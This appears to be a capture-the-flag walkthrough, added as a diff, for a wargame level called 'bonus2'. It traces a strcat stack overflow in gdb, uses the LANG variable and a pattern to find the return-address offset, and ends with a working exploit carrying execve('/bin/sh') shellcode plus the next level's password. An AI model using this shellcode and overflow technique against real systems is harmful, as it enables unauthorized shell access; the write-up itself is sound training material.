@@ -1,0 +1,114 @@
+
+██████╗  ██████╗ ███╗   ██╗██╗   ██╗███████╗    ██████╗ 
+██╔══██╗██╔═══██╗████╗  ██║██║   ██║██╔════╝    ╚════██╗
+██████╔╝██║   ██║██╔██╗ ██║██║   ██║███████╗     █████╔╝
+██╔══██╗██║   ██║██║╚██╗██║██║   ██║╚════██║    ██╔═══╝ 
+██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝███████║    ███████╗
+╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝    ╚══════╝
+                                                        
+
+gdb bonus2
+
+disas main
+
+<+15>:	cmpl   $0x3,0x8(%ebp)
+// Check if we have two arguments
+
+<+125>:	call   0x8048380 <getenv@plt>
+// Get the value of the environment variable "LANG".
+
+<+163>:	mov    0x9c(%esp),%eax
+<+170>:	mov    %eax,(%esp)
+<+173>:	call   0x8048360 <memcmp@plt>
+// Check if the variable "LANG" equals to "fi"
+// The same verificaiton is made later with LANG = "nl"
+
+     if LANG == EN, id = 0;
+else if LANG == FI, id = 1;
+else if LANG == NL, id = 2;
+
+0x08048564 <+59>:   movl   $0x28,0x8(%esp)
+0x0804856c <+67>:    mov    %eax,0x4(%esp)
+0x08048570 <+71>:    lea    0x50(%esp),%eax
+0x08048574 <+75>:    mov    %eax,(%esp)
+0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>)
+-> Copy the first 40 characters of argv[1] inside a variable.
+
+0x08048584 <+91>: movl   $0x20,0x8(%esp)
+0x0804858c <+99>:    mov    %eax,0x4(%esp)
+0x08048590 <+103>:   lea    0x50(%esp),%eax
+0x08048594 <+107>:   add    $0x28,%eax
+0x08048597 <+110>:   mov    %eax,(%esp)
+0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
+-> Copy the first 32 characters of argv[2] inside another variable.
+NB: This second variable is located 40 bytes further than the first variable.
+
+Then it make a call to:
+-> <+258>:	call   0x8048484 <greetuser>
+
+disas greetuser
+
+<+147>:	call   0x8048370 <strcat@plt>
+
+There is a call to strcat, so we can overflow it.
+
+run A B
+-> Hello A
+
+The strcat print the first parameter.
+So we will try to overflow this first paramter.
+
+Find the offset:
+
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+When LANG=en we can't rewrite the EIP completely:
+-> 0x08004141
+
+So we try with FI:
+Leave GDB and:
+export LANG="fi"
+
+gdb bonus2
+run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+-> 0x41414141
+
+
+The offset appears to be on the second parameter.
+So this is the second argument that we will have to overflow.
+Remplace it by a pattern metasploit:
+
+run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+-> 0x41366141
+The offset is 18.
+
+We will place our shellcode in the first argument, and indicate the address of it in the second argument at the offset 18.
+
+Get the address of the first argument:
+
+//set a breakpoint at <strcat>
+b *greetuset+147
+
+run `python -c "print 'A' * 40 + ' ' + 'A' * 18 + 'ADDR'"`
+
+// Display the s2 address of strcat. 
+// The string that will be concatenated to Hello/Hyvaa paivaa/etc..)
+x/x $esp+4 
+-> 0xbffff640
+
+Write the exploit:
+
+`python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+
+Run it:
+
+./bonus2 `python -c "print '\x44\xf6\xff\xbf' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 15 + ' ' + 'A' * 18 + '\x40\xf6\xff\xbf'"`
+
+cd ../bonus3 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587 |
+|══════════════════════════════════════════════════════════════════|
+
